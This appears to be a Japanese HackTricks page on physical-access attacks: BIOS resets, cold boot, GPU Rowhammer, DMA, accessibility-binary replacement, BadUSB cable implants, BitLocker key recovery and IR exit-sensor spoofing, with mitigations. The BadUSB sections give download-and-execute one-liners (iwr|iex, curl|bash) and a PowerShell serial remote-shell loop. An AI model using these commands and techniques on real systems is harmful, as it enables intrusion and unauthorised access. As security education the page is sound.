# 物理攻撃

{{#include ../banners/hacktricks-training.md}}

ボードレベルのインターフェースの特定、シリアルコンソール、フラッシュアクセス、サイドチャネル、グリッチングについては、[Hardware Hacking](hardware-hacking/README.md)と各インターフェースに特化した章を参照してください。このページでは、システム全体への物理アクセスを必要とする攻撃を扱います。

## BIOSパスワードの復旧とシステムセキュリティ

旧式のPCファームウェア設定は、CMOSバッテリーを取り外すか、マニュアルに記載されたCMOSクリア用ジャンパーを使用することでリセットできる場合があります。必要な電源オフ時間はマザーボードによって異なります。また、最新のUEFIパスワードやキーは不揮発性フラッシュ、組み込みコントローラー、またはセキュリティデバイスに保存されている場合があり、バッテリーを取り外しても消去されません。ピンをショートさせる前に、マザーボードまたはサービスマニュアルを確認してください。この手順によってTPMの測定値が無効になり、ディスク暗号化のリカバリーが必要になることもあります。

旧式のx86システムでは、**killCMOS**や**CmosPwd**などのツールを使い、ブート可能な環境からCMOSに保存された設定を調査または変更できます。CmosPwdは、文書化された旧式BIOSファミリーのパスワード形式を認識し、CMOSの状態をバックアップ、復元、消去／破棄できます。公開されているビルドは、旧式のDOS/Windows、Linux、FreeBSD、NetBSD環境を対象としています。<sup>[[18]](#references)</sup> これらのユーティリティは汎用のUEFIパスワード削除ツールではなく、十分なハードウェア／ファームウェアへのアクセスが必要です。

一部のノートPCファームウェアは、パスワード入力に何度か失敗すると、ベンダー固有のチャレンジコードを表示します。[bios-pw.org](https://bios-pw.org)などのデータベースでは、一部モデル向けに旧式のベンダーリカバリーパスワードを導出できますが、多くのシステムでは導出可能なチャレンジを使わずにロックアウトが実装されています。生成されたパスワードはモデル固有のものとして扱い、試行回数の恒久的な上限を使い切らないようにしてください。

### UEFIセキュリティ

最新の**UEFI**システムでは、CHIPSECを使ってSecure Boot変数の保護を監査できます。まずは、以下の変更を加えないチェックを実行してください。オプションの`-a modify`モードは変数の破損を意図的に試みるため、復旧可能なラボシステムでのみ使用してください。CHIPSEC自体も、特権ドライバーと低レベルのハードウェアアクセスは本番環境のエンドポイントには適さないと警告しています。<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## RAM解析とCold Boot攻撃

DRAMは、refreshが停止してもすべてのビットが直ちに失われるわけではありません。データの減衰速度はモジュール技術や温度によって大きく異なり、冷却すれば、電源を切った状態よりもはるかに長く有用なデータを保持できます。Cold Boot攻撃では、小規模な取得環境へすばやく再起動するか、冷却したモジュールを移設してraw memoryを取得し、ビットの減衰にもかかわらず暗号鍵を再構築します。ディスクコピー用ユーティリティが自動的に物理メモリのイメージ取得ツールになるわけではなく、Volatilityは取得ではなくキャプチャの解析を行います。プラットフォームに適した、検証済みの取得ツールを使用してください。<sup>[[12]](#references)</sup>

---

## Page Tableを標的とするGPU Rowhammer

最新のGPU Rowhammer攻撃は、通常のバッファではなく**GPU仮想メモリのメタデータ**を標的とすると、はるかに有効になります。**GDDR6を搭載したNVIDIA Ampere GPU**に関する最近の研究では、非特権のCUDAコードを実行する攻撃者がGPU固有のhammeringパターンを構築し、**memory massaging**でページング構造を脆弱な行に配置したうえで、**last-level page table**または中間の**page directory**のビットを反転できることが示されています。単一の変換エントリが破損すると、攻撃者は**任意のGPUメモリ読み書き**を実現し、さらにホスト侵害へと進むことができます。<sup>[[1]](#references)[[2]](#references)</sup>

### Exploitation Pattern

1. GDDR6内の**hammerable rowsをプロファイリング**し、DRAM内の緩和策を回避する、refreshを考慮した／非一様なhammeringパターンを構築します。
2. ドライバーがページ変換構造を既定の保護プールに保持せず、hammerableな物理位置に配置するよう、**GPU割り当てを調整**します。実際には、low-memory page-table領域を使い切り、制御されたstrideで大規模な疎なUVMマッピングを大量に作成する方法などがあります。
3. ページテーブル／ページディレクトリエントリ内の**PFN**やaperture関連ビットなどの**変換メタデータを反転**させ、攻撃者が制御する仮想ページがページテーブルページ、任意のGPUメモリ、またはホストから見えるシステムマッピングに解決されるようにします。
4. 偽造したマッピングを再利用して追加の変換エントリを書き換え、GPUコンテキストをまたいだ**任意のGPUメモリ読み書き**へと権限を昇格させます。

### Host Pivotと緩和策

- **IOMMUが無効**の場合、偽造したsystem-apertureマッピングにより、GPUから任意の**ホスト物理メモリ**にアクセスでき、GPUのプリミティブを使った完全なホスト侵害につながります。<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer**はlast-level page-tableエントリを標的とします。一方、**GeForge**は、1ビットの反転でより大きな変換サブツリーの参照先を変更できるため、page-directoryレベルの破損のほうが容易な場合があることを示しています。ページング層の1つだけをセキュリティ上重要とみなさないでください。<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU**は、GDDRHammer/GeForgeが利用するホストメモリへの直接的な任意アクセス経路を遮断するため、依然として重要ですが、**完全な緩和策ではありません**。**GPUBreach**は、攻撃者がGPUから書き込み可能なドライバー所有のCPUバッファを破損させ、さらにNVIDIAドライバーのメモリ安全性の不具合を引き起こして、IOMMUが有効な状態でもカーネル書き込みプリミティブと**root shell**を取得する、第2段階の攻撃経路を示しています。<sup>[[3]](#references)</sup>
- 対応するワークステーション／サーバーGPUでは、**システムレベルのECC**が実用的な強化策です。ECCのないコンシューマー向けGPUでは、防御の選択肢が限られます。<sup>[[4]](#references)</sup>
- これらの攻撃は純粋な理論上のものではありません。**GeForge**はRTX 3060で**1,171**件、RTX A6000で**202**件のビット反転を報告しており、ホスト権限昇格チェーンの実現には十分な数でした。<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direct Memory Access (DMA)攻撃

起動前のIOMMU適用をダウングレードし、Windows DMA攻撃チェーンを可能にする、オフラインでのUEFI IFR/NVRAMパッチ適用については、以下を参照してください。

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception**は、FireWireや初期のThunderbolt構成などのインターフェースを介した**DMAベースのメモリ取得とパッチ適用**を実証しており、過去のログインバイパスのシグネチャも含まれています。単に「Windows 10には効果がない」というものではありません。悪用可能性は、インターフェース、対象ビルド、IOMMUポリシー、ロック状態、およびWindows Kernel DMA Protectionがサポートされ有効になっているかどうかによって異なります。Windows 10 version 1803以降では、互換性のあるプラットフォームでKernel DMA Protectionが導入され、攻撃対象領域が大きく変わりました。<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USBによるシステムアクセス

暗号化されていない、またはすでにロック解除されているWindowsボリュームでは、オフライン環境から**sethc.exe**や**Utilman.exe**などのアクセシビリティバイナリを**cmd.exe**に置き換えることで、対応するログオン画面のショートカットが実行されたときにSYSTEMコマンドプロンプトを起動できます。**chntpw**などのツールで、ローカルSAMアカウントデータを編集できます。これらの方法はロックされたBitLockerボリュームを迂回できず、DPAPI/EFSで保護された認証情報を破損させるおそれがあります。フォレンジック用コピーとバックアップを保管してください。

**Kon-Boot**は、対応するWindows/macOS構成向けの商用起動時認証バイパスツールです。互換性はOS、ファームウェアモード、Secure Boot、ディスク暗号化の設定によって異なり、BitLockerでロックされたボリュームを復号することはできません。<sup>[[10]](#references)</sup>

---

## Windowsセキュリティ機能への対処

### 起動と回復のショートカット

- **Delete/Supr**、F2、F10、またはベンダー指定のキーでファームウェア設定を開ける場合があります。
- **F8**で従来のWindows詳細ブートオプションに入れるのは、その経路がまだ有効な構成に限られます。現在の回復環境への入り方は構成によって異なります。
- **Shift**を押し続けると、一部の構成ではWindowsの自動ログオンを抑止できますが、ポリシー／レジストリ設定でこの動作を無効にできます。<sup>[[17]](#references)</sup>

### BAD USBデバイス

**USB Rubber Ducky**やTeensyボードなどのデバイスは、信頼されたHIDキーボードとして認識され、定義済みのキー入力を注入できます。ペイロードは最初、ログオン中のセッションと同じ権限およびデスクトップアクセス権を持ちますが、UACプロンプト、画面ロック、キーボードレイアウト、タイミング、エンドポイントのUSBポリシーによる制約を受けます。<sup>[[15]](#references)</sup>

プログラム可能な周辺機器は、ホストのカーネルパーサーを攻撃したり、複数のUSBデバイスを連携させてheap groomingや情報開示を行ったりすることもできます。

{{#ref}}
../binary-exploitation/linux-kernel-exploitation/usb-audio-descriptor-oob-kaslr-leak.md
{{#endref}}

Windows UAS大容量記憶装置パーサーの事例については、以下を参照してください。

{{#ref}}
../binary-exploitation/windows-kernel-exploitation/uasp-report-luns-cache-size-oob-write.md
{{#endref}}

### Volume Shadow Copy

管理者権限またはバックアップ権限があれば、shadow copyを作成したり、レジストリハイブを保存したりして、**SAM**や**SYSTEM**などのロックされたファイルを取得できます。これは侵害後の収集手法であり、権限のバイパスではありません。`diskshadow`/VSSやレジストリハイブのエクスポートに関するイベントと関連付けて調査してください。

## BadUSB / HID Implant Techniques

### NFCで起動するAndroid HID gadget

root化したAndroidスマートフォンをプログラム可能なUSBキーボードにするには、USBコントローラーとカーネルが**USB gadget/HIDサポート**を備えている必要があります。対応デバイスでは、Kali NetHunterの**USB Arsenal**からgadgetプロファイルを利用できます。別の方法として[USB Gadget Tool](https://github.com/tejado/android-usb-gadget)があり、ConfigFS gadget機能を作成し、`/dev/hidg0`や`/dev/hidg1`などのキーボード／マウス用キャラクターデバイスを公開する場合があります。このツールが作成するのはgadgetエンドポイントだけであり、HIDレポートを書き込むには別のプロセスが必要です。rootアクセスがあっても、ConfigFS、HID gadgetサポート、または利用可能なUSB Device Controllerがないカーネルを補うことはできません。<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

このエンドポイントは、物理的なトリガーとしてAndroid NFCと組み合わせることができます。[NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)アプリはタグUIDを読み取り、想定される形式に変換し、ローカルの許可リストを確認します。一致すると、設定されたRubber Ducky形式のキーボードシーケンスを送信します。接続先のホストからは通常のキーボード入力として認識され、NFCソフトウェアは必要ありません。<sup>[[22]](#references)[[24]](#references)</sup>

ショートカットやコマンドを使う前に、空のテキストエディターでデバイスの認識とキーボードレイアウトを確認してください。無害なペイロードの例を示します。<sup>[[24]](#references)</sup>

```text
DELAY 1000
STRING NFC HID test successful
ENTER
```

重要な信頼境界:<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

- **UID whitelistは識別であり、認証ではありません**。UIDは公開情報であり、一部のトークンタイプやエミュレーターでは複製やなりすましが可能です。許可されたUIDをコピーすると、元のトークンと同じ処理経路をたどります。
- **NfcScreenOff** MagiskモジュールはNFCサービスにパッチを適用し、画面がオンでロック解除されているかのように動作させます。スマートフォンがすでにホストに接続されている場合、ロックを解除しなくてもペイロードを実行させられる可能性があります。
- ペイロードに保存されたパスワード、APIトークン、コマンドは、root化済みまたはブートローダーがアンロックされたデバイスでは回収可能な秘密情報です。HID経由でパスワードを入力するのは、パスワードレス認証ではなく、再利用可能なパスワードの自動入力です。
- HID injectionはアクティブなデスクトップの権限で動作し、フォーカス、タイミング、ホストのキーボードレイアウトに左右されます。機密性の高い操作を実行する前に直近のユーザー確認を必須とし、スクリプトに特権情報を含めず、実際の認証には暗号学的なチャレンジレスポンス認証器を使用してください。

### Wi-Fi対応のケーブル型インプラント

- **Evil Crow Cable Wind**のようなESP32-S3ベースのインプラントは、USB-A→USB-CまたはUSB-C↔USB-Cケーブル内に隠され、USBキーボードとしてのみ認識されます。C2スタックはWi-Fi経由で利用できます。オペレーターは、被害者のホストからケーブルに電力を供給し、パスワード`123456789`の`Evil Crow Cable Wind`という名前のホットスポットを作成して、[http://cable-wind.local/](http://cable-wind.local/)（またはDHCPアドレス）を開くだけで、組み込みHTTPインターフェースにアクセスできます。<sup>[[8]](#references)</sup>
- ブラウザーUIには、*Payload Editor*、*Upload Payload*、*List Payloads*、*AutoExec*、*Remote Shell*、*Config*の各タブがあります。保存されたペイロードにはOSごとのタグが付けられ、キーボードレイアウトは実行中に切り替えられ、既知の周辺機器を模倣するようVID/PID文字列を変更できます。
- C2がケーブル内にあるため、スマートフォンからペイロードの準備、実行のトリガー、Wi-Fi認証情報の管理ができ、組織のネットワークを使う必要がありません。これは、物理的侵入の滞在時間が短い場合に有効です。

### OS対応AutoExecペイロード

- AutoExecルールは、USBの列挙直後に実行する1つ以上のペイロードを割り当てます。インプラントは簡易的なOSフィンガープリンティングを行い、該当するスクリプトを選択します。
- 実行例:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`。
  - *macOS/Linux:* `COMMAND SPACE`（Spotlight）または`CTRL ALT T`（ターミナル）→ `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`。
- 実行は無人で行われるため、充電ケーブルを差し替えるだけで、ログイン中のユーザーのコンテキストで「plug-and-pwn」による初期アクセスを実現できます。

### Wi-Fi TCP経由のHID起動リモートシェル

1. **キーストロークによるブートストラップ:** 保存されたペイロードがコンソールを開き、新しいUSBシリアルデバイスに届いた内容を実行するループを貼り付けます。Windows向けの最小構成は次のとおりです:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Cable bridge:** implantは、ESP32-S3がTCP client（Python script、Android APK、またはdesktop executable）を起動してoperatorに接続する間、USB CDC channelを開いたままにします。TCP sessionに入力されたバイト列はすべて上記のserial loopに転送されるため、air-gapped hostでもremote command executionが可能です。出力は限られているため、operatorは通常、blind commands（アカウント作成、追加ツールの配置など）を実行します。

### HTTP OTAアップデートの攻撃対象領域

- Evil Crow Cable Windのドキュメントに記載されたinterfaceには、認証不要のfirmware-update endpoint `/update` が公開されています:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- フィールドオペレーターは、ケーブルを開けずにエンゲージメント中に機能をホットスワップできます（例: USB Army Knife firmwareをフラッシュする）。これにより、インプラントをターゲットホストに接続したまま、新たな機能へピボットできます。

## BitLocker Encryptionのバイパス

稼働中または最近稼働していたシステムを、許可を得てフォレンジック取得すると、ボリュームがアンロックされている間に、BitLockerのボリュームマスターキーまたは関連するキー素材が含まれている場合があります。Elcomsoft Forensic Disk DecryptorやPassware Kit Forensicなどの商用ツールは、対応するメモリーイメージ、休止状態ファイル、クラッシュダンプを検索できますが、成功は保証されません。最新のWindowsでは、BitLockerが有効な場合にクラッシュダンプも暗号化されます。また、保存されている48桁の回復パスワードは、メモリー内のボリュームキーとは別のアーティファクトです。<sup>[[12]](#references)[[16]](#references)</sup>

---

## 回復キー追加のためのソーシャルエンジニアリング

攻撃者は、管理者を説得してBitLocker管理コマンドを実行させることで、回復パスワード、外部キー、その他のプロテクターを追加し、それを取得できる場合があります。回復パスワードに任意のゼロの文字列は使用できません。BitLockerの数値回復パスワードは、検証済みの48桁形式である必要があります。許可を得た管理で使用する構文は `manage-bde -protectors -add C: -recoverypassword` です。追加されたプロテクターは `manage-bde -protectors -get C:` で一覧表示できます。プロテクターの追加を監視し、新しい回復素材が承認済みの場所にのみエスクローされるようにしてください。<sup>[[16]](#references)</sup>

---

## シャーシ侵入スイッチ／メンテナンススイッチを悪用したBIOSの工場出荷時リセット

最新のノートPCや小型デスクトップの多くには、Embedded Controller（EC）とBIOS/UEFI firmwareによって監視される**シャーシ侵入スイッチ**が搭載されています。このスイッチの主な目的は、デバイスが開けられたときにアラートを発することですが、ベンダーによっては、特定のパターンでスイッチを切り替えると起動する**未公開のリカバリーショートカット**を実装している場合があります。<sup>[[5]](#references)[[6]](#references)</sup>

### 攻撃の仕組み

1. スイッチはECの**GPIO割り込み**に接続されています。
2. EC上で動作するfirmwareが、**押下のタイミングと回数**を追跡します。
3. ハードコードされたパターンが認識されると、ECは*mainboard-reset*ルーチンを呼び出し、**システムNVRAM/CMOSの内容を消去**します。
4. 次回の起動時に、対象モデルはリセットされたfirmware状態を読み込みます。ベンダーやリビジョンによって、消去される状態には、スーパーバイザーパスワード、カスタムブート設定、登録済みのSecure Bootキーが含まれる場合があります。TPMの状態とディスク暗号化への影響は、別途評価する必要があります。

> firmwareをリセットすると外部ブートのオプションが復元される場合がありますが、**ストレージは復号されません**。TPM/firmwareの変更後にBitLockerやその他のフルディスク暗号化システムが回復モードになる場合でも、回復キーがなければ内蔵ドライブは保護されたままです。<sup>[[16]](#references)</sup>

### 実例 — Framework 13 Laptop

Framework 13（第11/12/13世代）のリカバリーショートカットは次のとおりです。

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

10回目のサイクル後、ECは次回の再起動時にBIOSがNVRAMを消去するよう指示するフラグを設定します。この一連の手順は約40秒で完了し、必要なのは**ドライバーだけ**です。<sup>[[5]](#references)</sup>

### 一般的な悪用手順

1. 対象機器の電源を入れるか、スリープから復帰させてECを起動する。
2. 底面カバーを外し、侵入検知／保守用スイッチを露出させる。
3. ベンダー固有の切り替えパターンを再現する（ドキュメントやフォーラムを調べるか、ECファームウェアをリバースエンジニアリングする）。
4. 組み立て直して再起動し、実際に変更されたファームウェア設定と認証情報を確認する。
5. 許可されており、外部ブートが利用できる場合は、管理下のライブイメージを起動する。内部ボリュームのロックを正規の方法で解除できた場合（または暗号化されていなかった場合）、ライブ環境から認証情報やデータを取得したり、EFI System Partitionを調査したりできる。このパーティションを変更してEFI implantをインストールする行為は永続的かつ非常に侵襲的であり、Secure Boot、measured boot、ファームウェアの書き込み保護、エンドポイント監視による制約を受ける。暗号化されたストレージは、鍵またはリカバリー情報がなければアクセスできない。

### 検知と緩和策

* OSの管理コンソールに筐体侵入イベントを記録し、予期しないBIOSリセットと関連付ける。
* 開封を検知できるよう、ネジやカバーに**改ざん検知シール**を貼る。
* デバイスを**物理的に管理されたエリア**に保管する。物理アクセスは完全な侵害につながるものと想定する。
* 利用可能な場合は、ベンダーの「maintenance switch reset」機能を無効にするか、NVRAMリセットに追加の暗号学的認証を要求する。

---

## 非接触式退出センサーに対する隠密IR Injection

### センサーの特性
- 一般的な「wave-to-exit」センサーは、近赤外LEDエミッターとTVリモコン型の受信モジュールを組み合わせており、正しい搬送波（約30 kHz）のパルスを複数回（約4～10回）受信した後にのみ、ロジックHighを出力する。<sup>[[7]](#references)</sup>
- プラスチック製のカバーによってエミッターとレシーバーが互いを直接見られないため、コントローラーは検証済みの搬送波が近くの反射から届いたと判断し、ドアストライクを開くリレーを作動させる。
- コントローラーは、ターゲットが存在すると判断すると送信側の変調エンベロープを変更することが多いが、レシーバーはフィルタリング済みの搬送波に一致するバーストなら受け入れ続ける。

### 攻撃の手順
1. **発光プロファイルを取得する** – コントローラーのピンにロジックアナライザーを接続し、内部IR LEDを駆動する検出前と検出後の両方の波形を記録する。
2. **「検出後」の波形だけを再生する** – 純正のエミッターを取り外すか無視し、最初からトリガー済みのパターンで外部IR LEDを駆動する。レシーバーはパルス数と周波数だけを見ているため、なりすまし搬送波を本物の反射として扱い、リレーラインをアサートする。
3. **送信をゲート制御する** – 調整したバースト（例：数十ミリ秒オン、同程度オフ）で搬送波を送信し、レシーバーのAGCや干渉処理ロジックを飽和させずに必要最小限のパルス数を送る。連続発光ではセンサーの感度がすぐに低下し、リレーが作動しなくなる。

### 長距離反射注入
- ベンチ用LEDを高出力IRダイオード、MOSFETドライバー、集光光学系に置き換えると、約6 m離れた場所から確実にトリガーできる。
- 攻撃者はレシーバーの開口部を見通せる位置にいる必要はない。ガラス越しに見える室内の壁、棚、ドア枠にビームを向けると、反射エネルギーが約30°の視野に入り、近距離で手を振ったように見せかけられる。
- レシーバーは弱い反射しか想定していないため、はるかに強い外部ビームでも、複数の面で反射した後に検出しきい値を上回ることがある。

### 武器化した攻撃用トーチ
- ドライバーを市販の懐中電灯に組み込めば、ツールを目立たないようにできる。可視LEDをレシーバーの帯域に合わせた高出力IR LEDに交換し、ATtiny412（または同等品）で約30 kHzのバーストを生成し、MOSFETでLED電流をシンクする。
- 伸縮式のズームレンズでビームを絞り、MCU制御の振動モーターで、可視光を出さずに変調が有効であることを触覚で知らせる。
- 周波数とエンベロープがわずかに異なる複数の変調パターンを切り替えると、リブランドされた複数のセンサーファミリーとの互換性が高まる。反射面を順に照射し、リレーの作動音がしてドアが解錠されるまで試せる。

---

## References

- [1] [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Kon-Boot official documentation and compatibility information](https://kon-boot.com/)
- [11] [CHIPSEC documentation - Secure Boot variable protections](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Lest We Remember: Cold Boot Attacks on Encryption Keys](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - physical memory manipulation over DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Ducky documentation](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker operations guide](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - holding Shift and automatic logon behavior](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwd documentation and downloads](https://www.cgsecurity.org/wiki/CmosPwd)
- [19] [Kali Linux Documentation - NetHunter USB-Arsenal](https://www.kali.org/docs/nethunter/nethunter-usbarsenal/)
- [20] [Linux kernel documentation - USB HID gadget driver](https://docs.kernel.org/usb/gadget_hid.html)
- [21] [USB Gadget Tool](https://github.com/tejado/android-usb-gadget)
- [22] [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)
- [23] [NfcScreenOff](https://github.com/Jon8RFC/NfcScreenOff)
- [24] [Turn a Rooted Android Phone into an NFC Authenticator and Automation Tool for Your PC](https://mobile-hacker.com/2026/09/21/turn-a-rooted-android-phone-into-an-nfc-authenticator-and-automation-tool-for-your-pc/)

{{#include ../banners/hacktricks-training.md}}
